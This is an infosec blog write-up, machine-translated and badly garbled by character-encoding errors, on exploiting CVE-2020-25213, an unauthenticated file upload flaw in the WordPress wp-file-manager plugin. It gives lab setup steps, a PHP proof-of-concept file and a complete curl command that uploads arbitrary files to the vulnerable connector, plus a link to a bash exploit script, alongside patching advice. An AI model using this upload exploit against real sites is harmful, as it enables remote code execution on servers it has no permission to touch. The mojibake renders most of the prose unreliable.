# å‰¥å‰Š CVE-2020â€“25213:WP-æ–‡ä»¶-ç®¡ç†å™¨ wordpress æ’ä»¶(<6.9) for unauthenticated arbitrary file upload

> åŸæ–‡ï¼š<https://infosecwriteups.com/exploiting-cve-2020-25213-wp-file-manager-wordpress-plugin-6-9-3f79241f0cd8?source=collection_archive---------0----------------------->

![](img/99267f2a0aef0e2e7420bed17c07f4b3.png)

Hello everyone!!

**Mansoor(@time4ster)** åœ¨æ­¤ã€‚è¿™æ˜¯æˆ‘å¯¹ä¿¡æ¯å®‰å…¨ç¤¾åŒºçš„ç¬¬ä¸€æ¬¡è´¡çŒ®ï¼Œæˆ‘å¸Œæœ›ä½ ä¼šå–œæ¬¢è¿™ç¯‡æ–‡ç« ã€‚

å¯¹äºæ¼æ´ä»£ç ï¼Œä½ å¯ä»¥ç›´æ¥è®¿é—®æˆ‘çš„ github [å›è´­](https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213)ã€‚

**å…è´£å£°æ˜ **

æˆ‘æ²¡æœ‰å‘ç°è¿™ä¸ªæ¼æ´&ä¹Ÿæ²¡æœ‰ä»è¿™ä¸ª CVE èº«ä¸Šå¾—åˆ°ä»»ä½•è£èª‰ã€‚æˆ‘åªæ˜¯åœ¨åˆ†æäº†å„ç§åšå®¢(å¦‚ [wordfence](https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/) ã€ [seravo](https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/) )ä¸Šçš„æè¿°ååˆ›å»ºäº†è¿™ä¸ªæ¼æ´ï¼Œå…¶åº§å³é“­æ˜¯è®©è¯»è€…äº†è§£å¦‚ä½•é€šè¿‡åˆ†ææ¼æ´çš„æè¿°æ¥åˆ›å»º POCã€‚

æˆ‘å¯¹ä½¿ç”¨è¯¥æ¼æ´ç»™ç»„ç»‡é€ æˆçš„ä»»ä½•æŸå¤±ä¸è´Ÿä»»ä½•è´£ä»»&æˆ‘å»ºè®®è¯»è€…åœ¨æ²¡æœ‰ç»„ç»‡ä¹¦é¢åŒæ„çš„æƒ…å†µä¸‹ä¸è¦åˆ©ç”¨è¯¥æ¼æ´ï¼Œå› ä¸ºå®ƒå¯èƒ½ä¼šä½¿ç»„ç»‡æš´éœ²äºå…¶ä»–é»‘å®¢çš„æ”»å‡»ä¹‹ä¸‹ã€‚

# å…³äºæ¼æ´:

[**CVE-2020â€“25213**](https://nvd.nist.gov/vuln/detail/CVE-2020-25213):WordPress 6.9 ä¹‹å‰çš„æ–‡ä»¶ç®¡ç†å™¨(wp-file-manager)æ’ä»¶å…è®¸è¿œç¨‹æ”»å‡»è€…ä¸Šä¼ å¹¶æ‰§è¡Œä»»æ„ PHP ä»£ç ï¼Œå› ä¸ºå®ƒå°†ä¸€ä¸ªä¸å®‰å…¨çš„ç¤ºä¾‹ elFinder è¿æ¥å™¨æ–‡ä»¶é‡å‘½åä¸ºå…·æœ‰ã€‚php æ‰©å±•ã€‚ä¾‹å¦‚ï¼Œè¿™ä½¿å¾—æ”»å‡»è€…èƒ½å¤Ÿè¿è¡Œ elFinder upload(æˆ– mkfile å’Œ put)å‘½ä»¤ï¼Œå°† PHP ä»£ç å†™å…¥ WP-content/plugins/WP-file-manager/lib/files/ç›®å½•ã€‚è¿™æ˜¯ 2020 å¹´ 8 æœˆå’Œ 9 æœˆåœ¨é‡å¤–å¼€é‡‡çš„ã€‚

**CVSS:** **9.8**

# å‘ç”Ÿäº†ä»€ä¹ˆäº‹ï¼Ÿ

åœ¨ 8 æœˆçš„æœ€åä¸€å‘¨ï¼Œè¯¥æ¼æ´å¼€å§‹ä½œä¸ºé›¶æ—¥è¢«åˆ©ç”¨ã€‚9 æœˆ 1 æ—¥ï¼Œæ’ä»¶å¼€å‘è€…ä¿®è¡¥äº†æ¼æ´&å‘å¸ƒäº†ç‰ˆæœ¬ **6.9ã€‚**è¡¥ä¸å‘å¸ƒåï¼Œå„ç§ç»„ç»‡å¦‚ [wordfence](https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/) ã€ [seravo](https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/) &è¿˜æœ‰ä¸€äº›ç»„ç»‡å‘è¡¨äº†åšå®¢ï¼Œæè¿° wp-file-manager zero day &å¦‚ä½•åœ¨é‡å¤–è¢«åˆ©ç”¨çš„ç»†èŠ‚ã€‚

# è®¾ç½®ç¯å¢ƒ

1.  åœ¨è™šæ‹Ÿæœº(æˆ–æœ¬åœ°ä¸»æœº)ä¸Šå®‰è£… wordpressã€‚åœ¨ ubuntu ä¸Šå®‰è£… wordpress å¯ä»¥å‚è€ƒè¿™ä¸ª[ç«™ç‚¹](https://ubuntu.com/tutorials/install-and-configure-wordpress#1-overview)ã€‚

2.ä»[è¿™é‡Œ](https://downloads.wordpress.org/plugin/wp-file-manager.6.0.zip)ä¸‹è½½å¹¶å®‰è£…æ˜“å—æ”»å‡»çš„ WP-æ–‡ä»¶ç®¡ç†å™¨æ’ä»¶(ç‰ˆæœ¬ 6.0)ã€‚

3.å®‰è£… El finder[å¯é€‰]

# åˆ›å»ºæ¼æ´

wp-file-manager æ’ä»¶ä½¿ç”¨çš„ **elFinder çš„**åº“çš„*/WP-content/plugins/WP-file-manager/lib/PHP/connector . minimal . PHP*æ–‡ä»¶è´Ÿè´£ä¸Šä¼ ä»»ä½•ç»™å®šæ‰©å±•åçš„ä»»æ„æ–‡ä»¶(æœªç»éªŒè¯)ã€‚

ä¸ºäº†ç†è§£ elFinder å¦‚ä½•ä¸Šä¼ æ–‡ä»¶ï¼Œè®©æˆ‘ä»¬é¦–å…ˆåœ¨ localhost ä¸Šä¸‹è½½å¹¶é…ç½® elFinderã€‚

```
git clone [https://github.com/Studio-42/elFinder.git](https://github.com/Studio-42/elFinder.git)
mv elFinder/php/connector.minimal.php-dist elFinder/php/connector.minimal.php
chown -R www-data:www-data elFinder/
```

åœ¨è®¿é—® */elFinder.html* æ—¶ï¼Œæ˜¾ç¤ºæ–‡ä»¶ç®¡ç†å™¨èœå•ï¼ŒåŒ…æ‹¬æ–‡ä»¶ä¸Šä¼ é€‰é¡¹:

![](img/b220696cc14ffdddc898058ac5c8c0f0.png)

ç°åœ¨ï¼Œæˆ‘ä»¬å°†ä¸Šä¼ ä»»ä½•å›¾åƒæ–‡ä»¶ï¼Œå¹¶åœ¨ burp å¥—ä»¶ä¸­ç›‘æ§è¯·æ±‚ã€‚

åœ¨ burp suite ä¸­ï¼ŒPOST è¯·æ±‚è¢«å‘é€åˆ°*/El finder/PHP/connector . minimal . PHP*&ä½œä¸ºå“åº”ï¼Œä½ç½®è¢«åæ˜ ä¸ºæ–‡ä»¶ä¸Šä¼ çš„ä½ç½®ã€‚

![](img/c39338d8f79270399bc4011f06133946.png)

ç°åœ¨æˆ‘ä»¬å°†æŠŠ*/El finder/PHP/connector . minimal . PHP*æ›¿æ¢ä¸º*/WordPress/WP-content/plugins/WP-file-manager/lib/PHP/connector . minimal . PHP*ã€æˆ‘ä»¬çš„ wordress ç«™ç‚¹ä¸­çš„æ’ä»¶ä½ç½®ã€‘&çœ‹çœ‹æˆ‘ä»¬æ˜¯å¦èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶ï¼Ÿ

æˆ‘ä»¬èƒ½å¤Ÿä¸Šä¼ æ–‡ä»¶å¤ªå¥½äº†ï¼ï¼è¿™æ„å‘³ç€ç°åœ¨æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä»»æ„æ‰©å±•åçš„ä»»æ„æ–‡ä»¶ã€‚

ä¸ºäº†ä¸Šä¼  php æ–‡ä»¶ï¼Œåœ¨ä¸Šé¢çš„è¯·æ±‚ä¸­(æ”¹å˜ URL ä¹‹å),æˆ‘ä»¬éœ€è¦å°†æ–‡ä»¶åæ”¹ä¸º poc_PHPinfo.phpï¼Œå…¶å†…å®¹ä¸º

```
<?php 
echo â€œPOC By Time4sterâ€;
phpinfo(); 
?>
```

&è€¶ï¼ï¼PHP æ–‡ä»¶è¢«ä¸Šä¼ ï¼ŒURL ä¹Ÿæ˜¾ç¤ºåœ¨æ–‡ä»¶ä¸Šä¼ çš„å“åº”ä¸­ã€‚

![](img/c318dd0bc407130bc17e69bf08bb8ab8.png)

ä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥åœ¨:[http://192 . 168 . 1 . 54/WordPress/WP-content/plugins/WP-file-manager/lib/files/POC _ phpinfo . PHP](http://192.168.1.54/wordpress/wp-content/plugins/wp-file-manager/lib/files/poc_PHPinfo.php)

![](img/94270b3a6e8392d6fec37e489dfd3c02.png)

ä¸Šè¿°æ‰“å—è¦æ±‚çš„ç­‰æ•ˆå·æ›²æœ‰æ•ˆè½½è·:

```
curl -ks â€” max-time 5 â€” user-agent â€œMozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36â€ -F â€œreqid=17457a1fe6959â€ -F â€œcmd=uploadâ€ -F â€œtarget=l1_Lwâ€ -F â€œmtime[]=1576045135â€ -F â€œupload[]=@//root/poc_PHPinfo.phpâ€ â€œ[http://192.168.1.54/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php](http://192.168.1.54/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php)"
```

è¿™é‡Œçš„ */root/poc_PHPinfo.php* æ–‡ä»¶å¯ä»¥æ›¿æ¢ä¸ºæˆ‘ä»¬æƒ³è¦ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šçš„ä»»æ„æ–‡ä»¶ã€‚

**æ³¨æ„:**æœ‰æ—¶å€™ php æ–‡ä»¶ä¼šè¢«é˜²ç«å¢™æ‹¦æˆªï¼Œæ‰€ä»¥æœ€å¥½å…ˆä¸Šä¼  txt æ–‡ä»¶æ¥ç¡®è®¤æ¼æ´ã€‚

è¿˜è¦æ³¨æ„ï¼Œä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥è¢«ä»»ä½•æœªç»è®¤è¯çš„ç”¨æˆ·è®¿é—®(åœ¨ php ä¸­ä¸º& executed ),æ‰€ä»¥ä¸Šä¼ æ–‡ä»¶æ—¶è¦å°å¿ƒã€‚

# å‰¥å‰Š

æˆ‘åˆ›å»ºçš„ Bash æ¼æ´åˆ©ç”¨ä»£ç :

[https://github . com/manso or 123/WP-file-manager-CVE-2020-25213](https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213)

# å½±å“

åˆ©ç”¨æ­¤æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥ä¸Šä¼  php æ–‡ä»¶å¹¶åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œæ–‡ä»¶ï¼Œè€Œæ— éœ€ä»»ä½•èº«ä»½éªŒè¯ï¼Œä»è€Œå¯¼è‡´æœºå™¨å®Œå…¨å—æŸã€‚(CVSS: 9.8 åˆ†)ã€‚

wp-file-manager æœ‰ 600ï¼Œ000 å¤šä¸ªæ´»è·ƒå®‰è£…ï¼Œå…¶ä¸­åªæœ‰ 53.3%çš„ç”¨æˆ·åœ¨æ’°å†™æœ¬æ–‡æ—¶å‡çº§åˆ°äº†æœ€æ–°çš„æ’ä»¶ç‰ˆæœ¬ 6.9ã€‚

![](img/d8ae0b9ca0ae186846605c7d245dace9.png)

æ¥æº:https://wordpress.org/plugins/wp-file-manager/advanced/

# ä¿®è¡¥

ä»[å‚å•†ç½‘ç«™](https://wordpress.org/plugins/wp-file-manager/)å‡çº§åˆ° wp-file-manager çš„æœ€æ–°ç‰ˆæœ¬(ç‰ˆæœ¬â‰¥6.9)ã€‚

# æ—¶é—´è¡¨

ä¸Šå‘¨ 8 æœˆ:æ¼æ´ä½œä¸ºé›¶æ—¥å¼€å§‹è¢«åˆ©ç”¨ã€‚

9 æœˆ 1 æ—¥:å‚å•†å‘å¸ƒè¡¥ä¸ã€‚

9 æœˆ 2 æ—¥:å„ç§åšå®¢å‘å¸ƒæè¿°è¿™ä¸ªé›¶æ—¥&æ¼æ´çš„ç»†èŠ‚ã€‚

9 æœˆ 4 æ—¥:åœ¨ç ”ç©¶äº†æ¼æ´ä¹‹åï¼Œåˆ›å»ºäº†æˆ‘çš„ bash æ¼æ´åˆ©ç”¨è„šæœ¬ã€‚

9 æœˆ 9 æ—¥:CVE 2020â€“25213 è¢«åˆ†é…åˆ°è¿™ä¸ªé›¶æ—¥åˆ©ç”¨ã€‚

# ä¿¡ç”¨

1.  [https://www . word fence . com/blog/2020/09/700000-WordPress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/](https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/)
2.  [https://seravo . com/blog/0-day-vulnerability-in-WP-file-manager/](https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/)

æ„Ÿè°¢æ‚¨é˜…è¯»è¿™ç¯‡æ–‡ç« ã€‚å¦‚æœä½ å–œæ¬¢æˆ‘çš„æŠ¥é“ï¼Œè¯·ç‚¹å‡»**ğŸ‘ä¸ä½ çš„æœ‹å‹åˆ†äº«ï¼Œè¿™å°†é¼“åŠ±æˆ‘åœ¨æœªæ¥å‘è¡¨æ›´å¤šçš„ Infosec æ–‡ç« ã€‚**